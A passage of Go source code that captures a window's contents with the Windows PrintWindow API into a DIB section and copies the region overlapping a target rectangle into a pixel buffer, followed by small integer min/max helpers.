			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
			biWidth:       int32(winW),
			biHeight:      -int32(winH),
			biPlanes:      1,
			biBitCount:    32,
			biCompression: BI_RGB,
		},
	}
	var bits unsafe.Pointer
	hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
	if hbmp == 0 || bits == nil {
		return false
	}
	selectObject(hdcMem, hbmp)
	defer deleteObject(hbmp)

	if !printWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT) {
		return false
	}

	buf := unsafe.Slice((*byte)(bits), winW*winH*4)
	winStride := winW * 4

	interLeft := maxInt(winLeft, bounds.Min.X)
	interTop := maxInt(winTop, bounds.Min.Y)
	interRight := minInt(winRight, bounds.Max.X)
	interBottom := minInt(winBottom, bounds.Max.Y)
	if interRight <= interLeft || interBottom <= interTop {
		return false
	}

	srcX := interLeft - winLeft
	srcY := interTop - winTop
	dstX := interLeft - bounds.Min.X
	dstY := interTop - bounds.Min.Y
	copyW := interRight - interLeft
	copyH := interBottom - interTop

	for y := 0; y < copyH; y++ {
		srcStart := (srcY+y)*winStride + srcX*4
		dstStart := (dstY+y)*targetStride + dstX*4
		copy(target[dstStart:dstStart+copyW*4], buf[srcStart:srcStart+copyW*4])
	}

	return true
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
